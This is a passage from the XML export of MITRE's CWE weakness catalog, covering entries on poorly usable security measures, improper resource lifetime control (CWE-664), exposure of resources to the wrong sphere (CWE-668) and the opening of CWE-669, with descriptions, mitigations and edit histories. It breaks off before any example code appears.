               <Impact>Bypass Protection Mechanism</Impact>
               <Note>By bypassing the security mechanism, a user might leave the system in a less secure state than intended by the administrator, making it more susceptible to compromise.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Where possible, perform human factors and usability studies to identify where your product's security mechanisms are difficult to use, and why.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make the security mechanism as seamless as possible, while also providing the user with sufficient details when a security decision produces unexpected results.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In "Usability of Security: A Case Study" [REF-540], the authors consider human factors in a cryptography product. Some of the weakness relevant discoveries of this case study were: users accidentally leaked sensitive information, could not figure out how to perform some tasks, thought they were enabling a security option when they were not, and made improper trust decisions.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Enforcing complex and difficult-to-remember passwords that need to be frequently changed for access to trivial resources, e.g., to use a black-and-white printer. Complex password requirements can also cause users to store the passwords in an unsafe manner so they don't have to remember them, such as using a sticky note or saving them in an unencrypted file.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Some CAPTCHA utilities produce images that are too difficult for a human to read, causing user frustration.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
	 <Taxonomy_Mappings>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 2-1</Entry_ID>
             <Entry_Name>Req 4.3.3.6</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
	     <Entry_ID>Part 4-1</Entry_ID>
             <Entry_Name>Req SD-4</Entry_Name>
           </Taxonomy_Mapping>
	 </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-539"/>
            <Reference External_Reference_ID="REF-540"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 14: Poor Usability.&#34; Page 217"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Other">This weakness covers many security measures causing user inconvenience, requiring effort or causing frustration, that are disproportionate to the risks or value of the protected assets, or that are perceived to be ineffective.</Note>
	    <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Pascal Meunier</Submission_Name>
               <Submission_Organization>Purdue University</Submission_Organization>
               <Submission_Date>2008-01-18</Submission_Date>
               <Submission_Version>Draft 8</Submission_Version>
               <Submission_ReleaseDate>2008-01-30</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>	
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Maintenance_Notes, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Time_of_Introduction, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>Nicolai Plum</Contribution_Name>
				  <Contribution_Date>2022-07-16</Contribution_Date>
				  <Contribution_Comment>Provided new links for a reference that improved multiple CWEs.</Contribution_Comment>
				</Contribution>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-01-24</Contribution_Date>
			   <Contribution_Version>4.10</Contribution_Version>
			   <Contribution_ReleaseDate>2023-01-31</Contribution_ReleaseDate>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2009-01-12">Design Principle Violation: Failure to Satisfy Psychological Acceptability</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Satisfy Psychological Acceptability</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="664" Name="Improper Control of a Resource Through its Lifetime" Abstraction="Pillar" Structure="Simple" Status="Draft">
         <Description>The product does not maintain or incorrectly maintains control over a resource throughout its lifetime of creation, use, and release.</Description>
         <Extended_Description>
            <xhtml:p>Resources often have explicit instructions on how to be created, used and destroyed. When code does not follow these instructions, it can lead to unexpected behaviors and potentially exploitable states.</xhtml:p>
            <xhtml:p>Even without explicit instructions, various principles are expected to be adhered to, such as "Do not use an object until after its creation is complete," or "do not use an object after it has been slated for destruction."</xhtml:p>
         </Extended_Description>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use Static analysis tools to check for unreleased resources.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2018-1000613</Reference>
               <Description>Cryptography API uses unsafe reflection when deserializing a private key</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-1000613</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-21668</Reference>
               <Description>Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-21668</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO39-C</Entry_ID>
               <Entry_Name>Do not alternately input and output from a stream without an intervening flush or positioning call</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="196"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="61"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry is high-level when lower-level children are available.</Rationale>
            <Comments>Consider children or descendants of this entry instead.</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Maintenance">More work is needed on this entry and its children. There are perspective/layering issues; for example, one breakdown is based on lifecycle phase (CWE-404, CWE-665), while other children are independent of lifecycle, such as CWE-400. Others do not specify as many bases or variants, such as CWE-704, which primarily covers numbers at this stage.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
                <Submission_Date>2008-04-11</Submission_Date>
                <Submission_Version>Draft 9</Submission_Version>
                <Submission_ReleaseDate>2008-04-11</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Relationships, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-05-27">Insufficient Control of a Resource Through its Lifetime</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="668" Name="Exposure of Resource to Wrong Sphere" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.</Description>
         <Extended_Description>
            <xhtml:p>Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.</xhtml:p>
            <xhtml:p>A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.</xhtml:p>
            <xhtml:p>In either case, the end result is that a resource has been exposed to the wrong party.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Other</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Other</Impact>
            </Consequence>
         </Common_Consequences>
         <References>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-668 is high-level and is often misused as a catch-all when lower-level CWE IDs might be applicable. It is sometimes used for low-information vulnerability reports [REF-1287]. It is a level-1 Class (i.e., a child of a Pillar). It is not useful for trend analysis.</Rationale>
            <Comments>Closely analyze the specific mistake that is allowing the resource to be exposed, and perform a CWE mapping for that mistake.</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Theoretical">A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Content Team</Submission_Name>
				<Submission_Organization>MITRE</Submission_Organization>
                <Submission_Date>2008-04-11</Submission_Date>
                <Submission_Version>Draft 9</Submission_Version>
                <Submission_ReleaseDate>2008-04-11</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-22</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Clarified description to include permissions.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Other_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Relevant_Properties</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="669" Name="Incorrect Resource Transfer Between Spheres" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="664" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>A "control sphere" is a set of resources and behaviors that are accessible to a single actor, or a group of actors. A product's security model will typically define multiple spheres, possibly implicitly. For example, a server might define one sphere for "administrators" who can create new user accounts with subdirectories under /home/server/, and a second sphere might cover the set of users who can create or delete files within their own subdirectories. A third sphere might be "users who are authenticated to the operating system on which the product is installed." Each sphere has different sets of actors and allowable behaviors.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Application Data</Impact>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.</Intro_Text>
               <Example_Code Nature="Good" Language="HTML">
